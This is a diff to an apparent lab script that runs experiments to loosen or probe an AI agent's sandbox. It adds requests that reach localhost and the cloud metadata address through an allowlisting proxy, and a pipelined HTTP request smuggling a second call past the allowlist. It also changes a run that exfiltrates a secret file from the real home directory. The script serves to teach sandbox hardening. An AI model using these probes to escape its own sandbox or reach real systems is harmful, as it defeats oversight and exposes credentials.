@@ -1,10 +1,12 @@
-"""Workbench 1, Break it: four experiments that loosen or probe the sandbox.
+"""Workbench 1, Break it: six experiments that loosen or probe the sandbox.
 
 Run on the lab VM after setup_sandbox.sh, one at a time:
     python3 break_it.py 1     # a channel through an allowlisted host
     python3 break_it.py 2     # memory and file-size limits
     python3 break_it.py 3     # switch the firewall rule off
     python3 break_it.py 4     # give the sandbox the real home directory
+    python3 break_it.py 5     # allowlisted names that point at this machine
+    python3 break_it.py 6     # two requests on one connection
 Predict each result before you run it. Experiment 3 deletes the firewall
 rule for the length of one run and puts it back afterwards.
 """
@@ -16,7 +18,7 @@ import sys
 from measure import (AGENT, LIMITS, PROXY, PY, RUN, bwrap, counter,
                      fresh_dir, loop_cmd, received, sh, start_services)
 
-which = sys.argv[1] if sys.argv[1:] and sys.argv[1] in list("1234") \
+which = sys.argv[1] if sys.argv[1:] and sys.argv[1] in list("123456") \
     else "1"
 
 
@@ -43,9 +45,20 @@ def allowed_channel():
     srv.shutdown()
 
 
-# ── 2. Resource limits ────────────────────────────────────────────────
+# ── 2. Who the process is, and resource limits ───────────────────────
+WHO = """
+import os
+print("uid, gid, groups:", os.getuid(), os.getgid(), os.getgroups())
+for line in open("/proc/self/status"):
+    if line.split(":")[0] in ("NoNewPrivs", "CapEff", "CapBnd"):
+        print(line.strip())
+"""
+
+
 def limits():
     wd = fresh_dir("break2")
+    who = sh(bwrap(wd, [PY, "-c", WHO]), cwd="/", timeout=60)
+    print("who the sandboxed process is:\n" + who.stdout.rstrip())
     for what, code in (
             ("allocate 3 GiB (limit 2 GiB of address space)",
              "x = bytearray(3 * 2**30); print('allocated')"),
@@ -87,12 +100,10 @@ def firewall_off():
 def real_home():
     srv, proxy, log = start_services()
     wd = fresh_dir("break4")
-    box = bwrap(wd, [])
-    i = box.index("--tmpfs", box.index("--tmpfs") + 1)    # the home tmpfs
-    box[i:i + 2] = ["--bind", f"/home/{AGENT}", f"/home/{AGENT}"]
-    cmd = box + LIMITS + [PY, "/opt/w01/research_loop.py", "--out", "/work",
-                          "--experiments", "6", "--exfil", "--secret",
-                          f"/home/{AGENT}/.w01-secret", "--proxy", PROXY]
+    cmd = bwrap(wd, LIMITS + [PY, "/opt/w01/research_loop.py", "--out",
+                              "/work", "--experiments", "6", "--exfil",
+                              "--secret", f"/home/{AGENT}/.w01-secret",
+                              "--proxy", PROXY], real_home=True)
     before = counter()
     done = sh(cmd, cwd="/", timeout=60)
     report = json.loads(done.stdout.strip().splitlines()[-1])
@@ -104,4 +115,66 @@ def real_home():
     srv.shutdown()
 
 
-{"1": allowed_channel, "2": limits, "3": firewall_off, "4": real_home}[which]()
+# ── 5. Allowlisted names that point at this machine ───────────────────
+INWARD = """
+import urllib.request as u
+op = u.build_opener(u.ProxyHandler({"http": "%s"}))
+for url in ("http://localhost/steal",
+            "http://169.254.169.254/latest/meta-data/"):
+    try:
+        r = op.open(u.Request(url, method="GET"), timeout=5)
+        print("%%-46s -> HTTP %%d" %% (url, r.status))
+    except Exception as e:
+        print("%%-46s -> %%s" %% (url, e))
+""" % PROXY
+
+
+def inward():
+    srv, proxy, log = start_services("pypi.org,localhost,169.254.169.254")
+    wd = fresh_dir("break5")
+    done = sh(bwrap(wd, LIMITS + [PY, "-c", INWARD]), cwd="/", timeout=60)
+    print(done.stdout.strip() or done.stderr.strip()[-300:])
+    print("canary received:", received or "nothing")
+    print("what the proxy logged:")
+    for line in open(log):
+        e = json.loads(line)
+        print("  ", {k: v for k, v in e.items() if k != "t"})
+    proxy.terminate()
+    srv.shutdown()
+
+
+# ── 6. Two requests on one connection ─────────────────────────────────
+SMUGGLE = """
+import socket
+s = socket.create_connection(("127.0.0.1", 3128), timeout=8)
+s.sendall(b"GET http://pypi.org/simple/ HTTP/1.1\\r\\nHost: pypi.org\\r\\n"
+          b"Connection: keep-alive\\r\\n\\r\\n"
+          b"GET http://localhost:9000/second HTTP/1.1\\r\\n"
+          b"Host: localhost\\r\\n\\r\\n")
+data = b""
+while True:
+    chunk = s.recv(65536)
+    if not chunk:
+        break
+    data += chunk
+print("replies on the connection:", data.count(b"HTTP/1."))
+print("first status line:", data.split(b"\\r\\n")[0].decode())
+"""
+
+
+def pipelined():
+    srv, proxy, log = start_services("pypi.org,localhost")
+    wd = fresh_dir("break6")
+    done = sh(bwrap(wd, LIMITS + [PY, "-c", SMUGGLE]), cwd="/", timeout=60)
+    print(done.stdout.strip() or done.stderr.strip()[-300:])
+    print("canary received:", received or "nothing")
+    print("what the proxy logged:")
+    for line in open(log):
+        e = json.loads(line)
+        print("  ", {k: v for k, v in e.items() if k != "t"})
+    proxy.terminate()
+    srv.shutdown()
+
+
+{"1": allowed_channel, "2": limits, "3": firewall_off, "4": real_home,
+ "5": inward, "6": pipelined}[which]()
